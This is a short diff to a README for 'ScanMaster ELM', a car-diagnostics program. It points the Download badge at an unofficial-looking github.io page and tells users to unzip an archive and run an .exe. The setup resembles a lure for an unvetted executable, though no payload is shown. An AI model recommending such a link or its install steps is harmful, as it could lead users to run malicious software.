@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install ScanMaster ELM and connect your ELM327 adapter to start diagnostics.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://scanmaster-elm-obd2.github.io/.github/)
 
 ## 📸 Overview
 ![scanmaster-live-data](https://github.com/user-attachments/assets/a4586549-0ced-4f1e-baa9-03c4718e88c7)
